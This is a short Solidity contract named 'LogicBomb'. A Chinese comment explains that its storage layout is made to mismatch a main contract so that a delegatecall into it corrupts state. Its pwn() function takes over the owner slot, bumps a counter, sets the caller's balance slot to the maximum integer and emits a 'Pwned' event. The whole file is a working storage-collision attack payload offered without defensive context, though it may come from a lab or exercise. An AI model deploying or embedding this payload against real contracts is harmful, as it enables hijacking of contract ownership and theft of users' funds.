// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract LogicBomb {
    // 与主合约存储布局不一致，delegatecall 后可破坏状态
    address public owner;
    uint256 public counter;
    mapping(address => uint256) public slots;

    event Pwned(address indexed caller, address indexed origin);

    function pwn() external {
        owner = msg.sender;
        counter += 1;
        slots[msg.sender] = type(uint256).max;
        emit Pwned(msg.sender, tx.origin);
    }
}
